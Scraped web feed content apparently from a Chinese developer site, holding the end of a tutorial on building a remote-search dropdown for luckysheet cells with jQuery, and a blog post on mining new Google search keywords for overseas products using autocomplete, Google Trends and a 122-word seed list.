#d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>远程搜索下拉控件是非常常见的控件，应用在表单填写场景下，也是非常合适的，本例将带领大家实现以下效果，并真实了解并熟悉 luckysheet 的二开流程。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fa9e707052b4260aa2b992a2395a52d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py0c2h1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767617266&amp;x-signature=Cjkf12XL8qDoAEnlzDnp11Lkez8%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-1">拓展单元格属性</h2>
<p>在官网上，有一个常见问题，既然已知批注是直接加到单元格属性上，那么，我们拓展属性，是不是可以参考批注的实现方案？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22fd9b12c2c6470fb53fbfb6a0b8ffcd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py0c2h1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767617266&amp;x-signature=1YQxfHygfcHNaEUdhyY4ILqUvJE%3D" alt="在这里插入图片描述" loading="lazy"/>
我们设定以下是远程搜索下拉的单元格拓展属性：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 扩展后的单元格对象</span>
<span class="hljs-keyword">const</span> cell = {
    <span class="hljs-attr">v</span>: <span class="hljs-literal">null</span>, <span class="hljs-comment">// 原始值</span>
    <span class="hljs-attr">m</span>: <span class="hljs-literal">null</span>, <span class="hljs-comment">// 显示值</span>
    <span class="hljs-attr">ct</span>: { <span class="hljs-attr">fa</span>: <span class="hljs-string">"General"</span>, <span class="hljs-attr">t</span>: <span class="hljs-string">"s"</span> },
    <span class="hljs-comment">// ... other properties</span>

    <span class="hljs-comment">// 新增远程搜索下拉配置</span>
    <span class="hljs-attr">remoteSelect</span>: {
        <span class="hljs-comment">// 是否启用远程搜索，[必传]</span>
        <span class="hljs-attr">enable</span>: <span class="hljs-built_in">boolean</span>,

        <span class="hljs-comment">// 用户输入时的回调函数，用于获取远程数据</span>
        <span class="hljs-title function_">onInput</span>(value): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt; {
            <span class="hljs-comment">// 这个函数需要返回一个Promise对象，resolve一个数组，数组的元素为下拉选项对象</span>
        }

        <span class="hljs-comment">// 用户选定某个选项后的回调函数</span>
        <span class="hljs-title function_">onSelect</span>(item): <span class="hljs-built_in">void</span> {
            <span class="hljs-comment">// item 为用户选定的选项对象，值是onInput函数返回的数组中的某个元素</span>
        }

        <span class="hljs-comment">// 是否需要设定当前输入单元格的值 [可选]</span>
        <span class="hljs-title function_">setValue</span>(item): <span class="hljs-built_in">string</span>{
           <span class="hljs-comment">// item 为用户选定的选项对象，需要返回一个字符串，用于设定单元格的值</span>
        },

        <span class="hljs-comment">// 自定义类名  [可选]</span>
        <span class="hljs-attr">popperClass</span>: <span class="hljs-built_in">string</span>,
    },
};
</code></pre>
<h2 data-id="heading-2">何时触发？</h2>
<p>在这个场景中，我们需要<code>在用户输入值时，进行远程数据获取，渲染列表</code>，因此，需要在用户进行编辑时，进行处理：</p>
<ol>
<li>一个方案，是在初始化 inputHTML 时，将相关事件处理：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/755689351f904e30a11d579d9ff5a471~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py0c2h1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767617266&amp;x-signature=%2FKJ62ts%2BnUnkohBygCBG2drzPuQ%3D" alt="在这里插入图片描述" loading="lazy"/></li>
</ol>
<pre><code class="hljs language-js" lang="js"> $(<span class="hljs-string">"body"</span>).<span class="hljs-title function_">append</span>(inputHTML)
 <span class="hljs-comment">// 进行相关事件绑定: [伪代码]</span>
 $input.<span class="hljs-title function_">on</span>(<span class="hljs-string">'input'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
 	<span class="hljs-comment">// 这里是未知具体单元格信息的，需要通过外部传递</span>
 	<span class="hljs-keyword">const</span> remoteSelectOptions = <span class="hljs-title class_">Store</span>.<span class="hljs-property">flowdata</span>[r][c]
 	<span class="hljs-comment">// 执行后续操作</span>
 })
</code></pre>
<ol start="2">
<li>另一个方案，是用户双击时，唤起输入框后，进行判断：</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// handler.js</span>
$(<span class="hljs-string">"#luckysheet-cell-main, #luckysheetTableContent"</span>).<span class="hljs-title function_">dblclick</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
	<span class="hljs-comment">// 这个函数是内置的哈，因此，可以直接获取到 r c</span>
	<span class="hljs-comment">// 判断当前单元格是否需要初始化远程搜索控件</span>
	<span class="hljs-title class_">RemoteSelect</span>.<span class="hljs-title function_">checkCellNeedRemoteSelect</span>(row_index, col_index)
})
</code></pre>
<p>两种方案我都试过了，<code>实现略有不同</code>，但都可以实现，还是借助原生的 dblclick 好处理些。</p>
<h2 data-id="heading-3">校验远程搜索下拉</h2>
<p>既然每一个单元格双击，都会触发这个校验，那么何时才需要初始化这个下拉框呢？</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 判断当前单元格是否需要显示下拉框</span>
<span class="hljs-attr">checkCellNeedRemoteSelect</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">r, c</span>) {
    <span class="hljs-comment">// 通过 r c 获取单元格信息</span>
    <span class="hljs-keyword">let</span> cell = <span class="hljs-title class_">Store</span>.<span class="hljs-property">flowdata</span>[r][c];

    <span class="hljs-comment">// 如果 cell 没有配置 remoteSelect 或者 remoteSelect.enable 为 false 则返回</span>
    <span class="hljs-keyword">if</span> (!cell || !cell.<span class="hljs-property">remoteSelect</span> || !cell.<span class="hljs-property">remoteSelect</span>.<span class="hljs-property">enable</span>) {
        <span class="hljs-keyword">return</span>;
    }
}
</code></pre>
<p>检验完成后，如果需要初始化校验，别忘了， 我们底层还要监听输入框事件哈：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 不然，开始监听 input 输入事件</span>
$(<span class="hljs-string">"#luckysheet-input-box .luckysheet-cell-input"</span>).<span class="hljs-title function_">off</span>(<span class="hljs-string">"input"</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">"input"</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">let</span> value = $(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">text</span>().<span class="hljs-title function_">trim</span>(); <span class="hljs-comment">// 获取用户输入的值</span>
      
        <span class="hljs-keyword">if</span> (cell.<span class="hljs-property">remoteSelect</span> &amp;&amp; cell.<span class="hljs-property">remoteSelect</span>.<span class="hljs-property">onInput</span> &amp;&amp; <span class="hljs-keyword">typeof</span> cell.<span class="hljs-property">remoteSelect</span>.<span class="hljs-property">onInput</span> == <span class="hljs-string">"function"</span>) {
            <span class="hljs-comment">// 调用外部接口</span>
            cell.<span class="hljs-property">remoteSelect</span>
                .<span class="hljs-title function_">onInput</span>(value)
                .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">dataList</span>) {
                    $this.<span class="hljs-property">loading</span> = <span class="hljs-literal">false</span>;
                    $this.<span class="hljs-title function_">showRemoteSelect</span>(dataList);
                })
                .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
                    $this.<span class="hljs-property">loading</span> = <span class="hljs-literal">false</span>;
                    $this.<span class="hljs-title function_">hideRemoteSelect</span>();
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"请求接口错误"</span>, error);
                    tooltip.<span class="hljs-title function_">info</span>(<span class="hljs-string">'&lt;i class="fa fa-exclamation-triangle"&gt;&lt;/i&gt;'</span>, <span class="hljs-string">"接口请求失败"</span>);
                });
        }
    });
</code></pre>
<h2 data-id="heading-4">初始化下拉框</h2>
<p>远程搜索的核心，就是下拉选项，当远程接口初始化完成后，执行如下：</p>
<pre><code class="hljs language-js" lang="js">dataList.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
	<span class="hljs-keyword">const</span> $item = $(<span class="hljs-string">`&lt;div class="<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.selectItemClass}</span>"&gt;`</span>)
		.<span class="hljs-title function_">text</span>(item)
		.<span class="hljs-title function_">click</span>(<span class="hljs-function">() =&gt;</span> {
			<span class="hljs-comment">// 触发选择回调</span>
			<span class="hljs-keyword">if</span> (cell.<span class="hljs-property">remoteSelect</span> &amp;&amp; cell.<span class="hljs-property">remoteSelect</span>.<span class="hljs-property">onSelect</span> &amp;&amp; <span class="hljs-keyword">typeof</span> cell.<span class="hljs-property">remoteSelect</span>.<span class="hljs-property">onSelect</span> === <span class="hljs-string">"function"</span>) {
    		cell.<span class="hljs-property">remoteSelect</span>.<span class="hljs-title function_">onSelect</span>(item);
			}
		})
</code></pre>
<p>这里就一个难点要处理，如何将下拉框定位到输入框的位置：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 这里采用巧方案，直接取输入框的位置</span>
<span class="hljs-keyword">const</span> $input = $(<span class="hljs-string">"#luckysheet-input-box"</span>);
<span class="hljs-keyword">const</span> left = <span class="hljs-built_in">parseInt</span>($input.<span class="hljs-title function_">css</span>(<span class="hljs-string">"left"</span>)) || <span class="hljs-number">0</span>;
<span class="hljs-keyword">const</span> top = <span class="hljs-built_in">parseInt</span>($input.<span class="hljs-title function_">css</span>(<span class="hljs-string">"top"</span>)) || <span class="hljs-number">0</span>;

<span class="hljs-comment">// 获取当前单元格的高度 行高</span>
<span class="hljs-keyword">const</span> [_row_pre, rowHeight] = <span class="hljs-title function_">rowLocation</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">r</span>);

<span class="hljs-comment">// 设置下拉框位置和宽度</span>
$selectBox.<span class="hljs-title function_">css</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-string">`<span class="hljs-subst">${top + rowHeight + <span class="hljs-number">4</span>}</span>px`</span>, <span class="hljs-comment">// 在单元格下方显示</span>
    <span class="hljs-attr">left</span>: <span class="hljs-string">`<span class="hljs-subst">${left}</span>px`</span>,
});
</code></pre>
<h2 data-id="heading-5">总结</h2>
<p>虽然代码看起来不复杂，但是了解luckysheet 的源码、实现思路，以及单元格拓展实现方案是非常重要的。</p>
<p>通过本次实现，我们初步了解了luckysheet的二次开发流程，在不破坏原有功能的基础上添加新特性。远程搜索下拉控件的实现展示了如何在现有表格组件基础上，通过合理的架构设计和代码组织，添加复杂交互功能。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[出海需求怎么挖？我用 Google “新词”找到 0-1 的机会（附 122 个词根）]]></title>    <link>https://juejin.cn/post/7589107312112975881</link>    <guid>https://juejin.cn/post/7589107312112975881</guid>    <pubDate>2025-12-29T13:02:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589107312112975881" data-draft-id="7589093895327105033" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="出海需求怎么挖？我用 Google “新词”找到 0-1 的机会（附 122 个词根）"/> <meta itemprop="keywords" content="创业,产品,AI编程"/> <meta itemprop="datePublished" content="2025-12-29T13:02:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="孟健AI编程"/> <meta itemprop="url" content="https://juejin.cn/user/4212984287073895"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            出海需求怎么挖？我用 Google “新词”找到 0-1 的机会（附 122 个词根）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984287073895/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    孟健AI编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T13:02:16.000Z" title="Mon Dec 29 2025 13:02:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是孟健。</p>
<p>刚刚参加完破局线下的 AI 大会。</p>
<p>在我的夜话会上，大家问得最多的一个问题是：</p>
<p><strong>怎样挖掘需求？</strong></p>
<p>看起来这件事，确实难住了很多人。</p>
<p>今天我就把我们团队现阶段最常用、也最“科学”的找需求方法，整理成一篇可复用的 SOP。</p>
<p>先讲一个底层认知：<strong>海外搜索市场，基本就是 Google 的主场。</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83d4ea6f4eab43efaabd3b72fd81df34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767618135&amp;x-signature=aLnkPm5zoY9s%2FhPXMvOQ3dahLuQ%3D" alt="" loading="lazy"/></p>
<p>所以，对“出海做产品/做站”的人来说，找需求最稳的一条路，其实是：</p>
<p><strong>去挖关键词。</strong></p>
<p>这里的关键词，指的是用户每天真实输入到 Google 搜索框里的那些词、短语、句子。</p>
<p>因为：<strong>搜索的背后，就是需求。</strong></p>
<h3 data-id="heading-0">一、先把关键词分清楚：新词 vs 老词</h3>
<p>关键词挖掘听起来简单，但如果你不做分类，很容易陷入“什么都能做，但不知道先做什么”的状态。</p>
<p>我们通常把关键词分成两类：</p>
<ul>
<li>
<p><strong>新词</strong>：最近 3 个月出现的词（这是主观划分，你也可以用 6 个月 / 12 个月）</p>
</li>
<li>
<p><strong>老词</strong>：更早就存在、已经被大量站点覆盖过的词</p>
</li>
</ul>
<p>因为 Google 曾披露：<strong>每天大约有 15% 的搜索，是全新的查询。</strong></p>
<p>换句话说：每天都有一批“刚出现”的需求，还没被足够多的页面满足。</p>
<p>这对我们意味着什么？</p>
<ul>
<li>
<p>如果你做老词，常见情况是：竞争大、索引慢、起量慢</p>
</li>
<li>
<p>但如果你抓到新词窗口期，并快速做出能满足需求的页面/工具，往往更容易更快被收录，甚至更快拿到更靠前的排名</p>
</li>
</ul>
<p>这就是红利。</p>
<p>逻辑跟“AI 热点事件写文章”很像：<strong>越早满足，越容易吃到第一波流量</strong>——甚至有时候红利还更大。</p>
<p>所以，我们现阶段的重点是：<strong>以新词挖掘为主</strong>。</p>
<h3 data-id="heading-1">二、新词怎么挖？两件工具就够了</h3>
<p>很多人以为挖词要用一堆付费工具。</p>
<p>但对 0-1 的新手来说，真的没必要。</p>
<p>我们最常用的就两个：</p>
<ul>
<li>
<p>Google 搜索（下拉联想）</p>
</li>
<li>
<p>Google Trends（趋势）</p>
</li>
</ul>
<h4 data-id="heading-2">1）用 Google 下拉联想挖词（Autocomplete）</h4>
<p>你在 Google 搜索框里输入一个词时，它会自动给出一堆“大家常搜的相关词”。</p>
<p>这就是最直接的需求线索。</p>
<p>实操时，你可以用“空格”组合出更多变体：</p>
<ul>
<li>
<p><strong>词后空格</strong>：<code>ai␣</code> → 看它往后接什么（<code>␣</code> 表示空格）</p>
</li>
<li>
<p><strong>词前空格</strong>：<code>␣ai</code> → 看它前面常出现什么</p>
</li>
<li>
<p><strong>词中空格</strong>：把词拆开 → 看中间会被补成什么</p>
</li>
</ul>
<p>搭配使用，你能很快扩出一堆候选词。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97e05bfc676745da9eae2bd078ef6d52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767618135&amp;x-signature=JtmzjjtLJPR0xNZ84QgNJT9smTk%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-3">2）用 Google Trends 找“飙升”的新词</h4>
<p>Google Trends 是找新词的神器。</p>
<p>方法也很简单：</p>
<ol>
<li>
<p>打开 <code>https://trends.google.com/trends/</code></p>
</li>
<li>
<p>把时间范围缩短到 <strong>7 天</strong></p>
</li>
<li>
<p>重点看 <strong>飙升（Rising）</strong> 的关键词</p>
</li>
</ol>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Ftrends.google.com%2Ftrends%2F" target="_blank" title="https://trends.google.com/trends/" ref="nofollow noopener noreferrer">trends.google.com/trends/</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd6764bcfe0d4ca5a6b0b445c7cd3ce9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767618135&amp;x-signature=xAN69sffDUWs9%2FdCIP67AcnvT00%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad9f859cbb5746678625cc553410875c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767618135&amp;x-signature=cGK%2BxScQG%2Fo85dusNFGkn6PBTMs%3D" alt="" loading="lazy"/></p>
<p>举个例子：上面这个 <code>kling ai motion poster</code>，就是我从 <code>ai</code> 这个词一路顺藤摸瓜挖出来的新词。</p>
<p>它大概率对应“可灵（Kling）模型”的某类具体需求。</p>
<p>至于值不值得做，是下一步的事——<strong>今天我们只讲：怎么找到这些词。</strong></p>
<p>基本上，靠 Google 下拉 + Trends 7 天飙升，你已经能抓到绝大部分新词了。</p>
<p>我们一直在用的也是这套方法。</p>
<h3 data-id="heading-4">三、关键难点：你得先有“词根”</h3>
<p>你可能已经发现了一个问题：</p>
<p>无论是下拉联想，还是 Trends，你都得先输入一个词，才会给你更多相关词。</p>
<p>那问题来了：<strong>我应该先输入什么？</strong></p>
<p>答案是：你需要一套“词根库”（seed list）。</p>
<p>这里要感谢哥飞大佬提供的 51 个词根。</p>
<p>我们在这个基础上扩展到了 <strong>122 个词根</strong>，今天直接分享给大家（可直接复制）：</p>
<pre><code class="hljs language-css" lang="css">action,advisor,agent,ai,analyzer
anime,answer,art,assistant,<span class="hljs-selector-tag">audio</span>
avatar,best,builder,calculator,cartoon
cataloger,character,chart,chat,cheat
checker,clue,<span class="hljs-selector-tag">code</span>,coloring page,comparator
compiler,composer,connector,constructor,convert
converter,crawler,creator,dashboard,designer
detector,diagram,directory,downloader,editor
emoji,enhancer,evaluator,example,explorer
extractor,face,faq,<span class="hljs-selector-tag">figure</span>,<span class="hljs-attribute">filter</span>
finder,<span class="hljs-attribute">font</span>,format,generator,graph
guide,helper,hint,how <span class="hljs-selector-tag">to</span>,humanizer
<span class="hljs-attribute">icon</span>,ideas,illustration,image,interior design
interpreter,layout,list,logo,maker
manager,meme,model,modifier,monitor
music,navigator,notifier,online,optimizer
paraphraser,pattern,photo,picture,planner
portal,portrait,processor,product photo,receiver
recommend,recorder,resources,responder,restorer
review,sample,scheduler,scraper,sender
simulator,solver,song,sound,speech
starter,studio,style,summarizer,<span class="hljs-selector-tag">summary</span>
syncer,tattoo,template
tester,text
</code></pre>
<p>一个很简单但非常有效的建议：</p>
<p><strong>每天把这份词根过一遍，随便挑 5 个丢进 Google / Trends，去看联想词和飙升词。</strong></p>
<p>只要你坚持一段时间，你一定会开始“看到”需求。</p>
<h3 data-id="heading-5">四、再进阶一点：监控大站 sitemap（游戏方向很好用）</h3>
<p>除了上面这套“通用挖词”方法，我们还会做一件事：</p>
<p><strong>监控一些游戏大站的 sitemap 更新</strong>（比如 CrazyGames 等），从它们新增的页面里反推新词和新需求。</p>
<p>这一步需要一点技术手段。</p>
<p>如果你是程序员，可以尝试自己写脚本去监控 sitemap 的更新频率、新增 URL、页面标题变化等。</p>
<p>你会发现：很多“刚冒头”的小游戏关键词，就是这样被挖出来的。</p>
<h3 data-id="heading-6">五、写在最后：别小看“简单的方法”</h3>
<p>以上就是我们现阶段挖掘需求（尤其是新词需求）的一整套方法。</p>
<p>它不花哨，但足够实用。</p>
<p>新手用这套方法跑通 0-1 完全没问题。</p>
<p>至于老词挖掘，玩法确实更多，但对 0-1 的新手不友好。</p>
<p>等我们把老词打法跑出更稳定的结果，我再把那一套也完整拆开分享给大家。</p>
<p>如果这篇文章对你有帮助，欢迎点个赞、在看、转发三连。</p>
<p>我们下期再见！</p>
<hr/>
<p>🚀 想要与更多AI爱好者交流，共同成长吗？</p>
